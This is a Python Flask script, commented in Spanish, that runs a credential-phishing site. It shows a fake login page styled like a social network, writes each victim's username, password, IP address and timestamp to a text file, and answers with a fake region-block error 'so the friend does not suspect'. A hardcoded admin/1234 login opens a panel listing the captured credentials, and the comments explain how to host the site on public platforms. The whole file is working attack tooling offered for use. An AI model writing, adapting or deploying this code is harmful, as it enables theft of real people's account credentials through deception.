import os
from datetime import datetime
from flask import Flask, request, render_template_string

app = Flask(_name_)

# Archivo donde se guardarán las capturas
LOG_FILE = "capturas.txt"

# HTML: Diseño de la web y del Panel de Admin
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Acceso al Sistema</title>
    <style>
        body { font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; padding: 50px; }
        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 400px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 16px; }
        button:hover { background: #166fe5; }
        .admin-table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 11px; }
        .admin-table th, .admin-table td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        .admin-table th { background: #f8f9fa; }
    </style>
</head>
<body>
    <div class="card">
        {% if modo == 'admin' %}
            <h2>Panel de Capturas</h2>
            <table class="admin-table">
                <tr><th>Fecha</th><th>IP</th><th>User</th><th>Pass</th></tr>
                {% for linea in registros %}
                    <tr>
                        {% set partes = linea.split('|') %}
                        <td>{{ partes[0] }}</td><td>{{ partes[1] }}</td><td>{{ partes[2] }}</td><td>{{ partes[3] }}</td>
                    </tr>
                {% endfor %}
            </table>
            <br><a href="/" style="color: #1877f2; text-decoration: none;">Cerrar Sesión</a>
        {% else %}
            <h2 style="text-align:center">Iniciar Sesión</h2>
            <form method="POST" action="/login">
                <input type="text" name="user" placeholder="Correo electrónico o teléfono" required>
                <input type="password" name="pass" placeholder="Contraseña" required>
                <button type="submit">Entrar</button>
            </form>
        {% endif %}
    </div>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE, modo='login')

@app.route('/login', methods=['POST'])
def login():
    usuario = request.form.get('user')
    password = request.form.get('pass')
    # Detecta la IP real incluso a través de túneles
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    fecha = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Si tú entras con estas credenciales, ves los resultados
    if usuario == "admin" and password == "1234":
        registros = []
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                registros = f.readlines()
        return render_template_string(HTML_TEMPLATE, modo='admin', registros=registros)
    
    # Si entra tu amigo, se guardan sus datos
    else:
        with open(LOG_FILE, "a") as f:
            f.write(f"{fecha} | {ip} | {usuario} | {password}\n")
        
        # Le mostramos un error falso para que no sospeche
        return "<h1>Error 403</h1><p>El servicio no está disponible en su región actualmente.</p>"

if _name_ == '_main_':
    # Configuración para que funcione en Render, Railway o PythonAnywhere
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)